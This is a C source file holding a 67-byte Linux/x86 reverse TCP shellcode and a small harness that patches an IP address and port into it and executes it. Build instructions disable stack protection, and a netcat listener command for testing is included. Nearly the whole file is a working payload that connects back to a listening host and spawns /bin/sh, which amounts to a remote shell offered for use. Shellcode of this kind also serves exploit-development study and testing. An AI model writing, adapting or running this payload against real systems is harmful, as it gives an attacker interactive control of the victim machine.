/*

 Tiny Shell Reverse TCP Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/


/*

   tiny_shell_reverse_tcp_shellcode

   * 67 bytes
   * null-free if the IP and port are


   # gcc -m32 -fno-stack-protector -z execstack tiny_shell_reverse_tcp_shellcode.c -o tiny_shell_reverse_tcp_shellcode

   Testing
   # nc -l 127.1.1.1 11111
   # ./tiny_shell_reverse_tcp_shellcode

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd"
"\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01"
"\x01\x66\x68\x2b\x67\x66\x6a\x02\x89\xe1"
"\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x31\xc9\xcd\x80";

main ()
{

        // When the Port contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

	// Setting the IP
		 "movl $0x0101017f, (code+27)\n\t"

	// Setting the port
		 "movw $0x672b, (code+33)\n\t"

	// Calling the shellcode
		 "call code");

}
